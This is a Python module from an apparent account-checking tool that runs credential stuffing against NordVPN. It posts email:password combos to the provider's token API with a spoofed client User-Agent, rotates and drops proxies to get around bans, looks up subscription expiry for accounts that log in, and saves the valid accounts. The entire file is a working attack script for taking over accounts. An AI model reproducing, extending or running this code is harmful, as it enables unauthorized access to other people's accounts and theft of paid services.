from checkolotl.utils.proxy import get_proxy, remove_proxy
from checkolotl.settings import settings
from checkolotl.saver import save

import base64
import time
from datetime import datetime
import requests
import urllib
header_one = {
    "Accept": "\"/\"",
    "User-Agent": "NordApp windows (main/6.18.9.0) windows/Microsoft Windows NT 10.0.17134.0",
    "Content-Type": "application/x-www-form-urlencoded"
}


def check(combo):
    email, password = combo.split(":", 1)
    email_encoded = urllib.parse.quote(email)
    password_encoded = urllib.parse.quote(password)

    body_one = f"username={email_encoded}&password={password_encoded}"
    proxies_to_ban = []
    for i in range(settings.checkers.nordvpn.check_amount):
        proxy = get_proxy("nordvpn")
        proxy_dict = {
            "http": proxy,
            "https": proxy
        }
        try:
            r = requests.post(url="https://zwyr157wwiu6eior.com/v1/users/tokens",
                              headers=header_one,
                              data=body_one,
                              timeout=settings.checkers.nordvpn.timeout,
                              proxies=proxy_dict)
        except:
            if settings.checkers.nordvpn.remove_banned_proxy:
                proxies_to_ban.append(proxy)
            continue
        if r.status_code == 201:
            token = r.json().get("token")
            next_check = check2(token, proxy)
            if next_check[0]:
                expire_time = datetime.strptime(next_check[0], "%Y-%m-%d %H:%M:%S")
                replace_dict = {
                    "expireunix": str(int(time.mktime(expire_time.timetuple()))),
                    "email": email,
                    "password": password
                }
                account = str(settings.checkers.nordvpn.account_format).format(**replace_dict)
                account = expire_time.strftime(account)
                save("nordvpn", account)
            if next_check[1]:
                proxies_to_ban.extend(next_check[1])
            for proxy in proxies_to_ban:
                remove_proxy("nordvpn", proxy)
            return
        elif r.status_code == 401:
            return
        else:
            if settings.checkers.nordvpn.remove_banned_proxy:
                proxies_to_ban.append(proxy)
            continue


def check2(token, proxy):
    token = base64.b64encode(("token:" + token).encode(encoding="utf-8")).decode("utf-8")
    header = {
        "Authorization": "Basic " + token,
        "Accept": "\"/\"",
        "User-Agent": "NordApp windows (main/6.18.9.0) windows/Microsoft Windows NT 10.0.17134.0",
    }
    proxy = proxy

    proxies_to_ban = []
    for i in range(settings.checkers.nordvpn.check_amount):
        proxy_dict = {
            "http": proxy,
            "https": proxy
        }
        try:
            r = requests.get(url="https://zwyr157wwiu6eior.com/v1/users/services",
                              headers=header,
                              timeout=settings.checkers.nordvpn.timeout,
                              proxies=proxy_dict)
        except:
            proxies_to_ban.append(proxy)
            proxy = get_proxy("nordvpn")
            continue
        if r.status_code == 200:
            if r.text == "[]":
                return [None, proxies_to_ban]
            expire_date = r.json()[0].get("expires_at")
            return [expire_date, proxies_to_ban]
        if r.status_code == 400:
            return [None, None]
    return [None, None]

